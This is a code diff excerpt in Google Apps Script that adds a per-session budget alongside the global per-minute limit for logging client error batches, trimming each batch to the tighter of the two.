+  // on cache trouble: losing telemetry beats erroring, and the sheet write below
+  // is the only real cost.
   var cache = null;
-  var budgetKey = null;
   try {
     cache = CacheService.getScriptCache();
-    budgetKey = 'cerr_' + Math.floor(Date.now() / 60000);
-    var used = parseInt(cache.get(budgetKey), 10) || 0;
-    if (used >= CLIENT_ERRORS_PER_MINUTE) {
+    var minute = Math.floor(Date.now() / 60000);
+    var globalKey = 'cerr_' + minute;
+    var sessKey = sessionId ? ('cerr_s_' + sessionId + '_' + minute) : null;
+
+    var globalUsed = parseInt(cache.get(globalKey), 10) || 0;
+    var sessUsed = sessKey ? (parseInt(cache.get(sessKey), 10) || 0) : 0;
+
+    if (globalUsed >= CLIENT_ERRORS_PER_MINUTE ||
+        (sessKey && sessUsed >= CLIENT_ERRORS_PER_SESSION_PER_MINUTE)) {
       return { status: 'ok', accepted: 0, dropped: batch.length };
     }
-    if (used + batch.length > CLIENT_ERRORS_PER_MINUTE) {
-      batch = batch.slice(0, CLIENT_ERRORS_PER_MINUTE - used);
-    }
-    cache.put(budgetKey, String(used + batch.length), 120);
+
+    // Trim the batch to whichever budget (global / per-session) is tighter.
+    var allowed = CLIENT_ERRORS_PER_MINUTE - globalUsed;
+    if (sessKey) allowed = Math.min(allowed, CLIENT_ERRORS_PER_SESSION_PER_MINUTE - sessUsed);
+    if (batch.length > allowed) batch = batch.slice(0, allowed);
+
+    cache.put(globalKey, String(globalUsed + batch.length), 120);
+    if (sessKey) cache.put(sessKey, String(sessUsed + batch.length), 120);
   } catch (e) {
     // cache unavailable — accept the batch unmetered
   }
 
   var loggedAt = new Date().toISOString();
-  var sessionId = clip(data.sessionId, 40);
   var appVersion = clip(data.appVersion, 20);
   var page = clip(data.page, 300);
   var userAgent = clip(data.userAgent, 300);
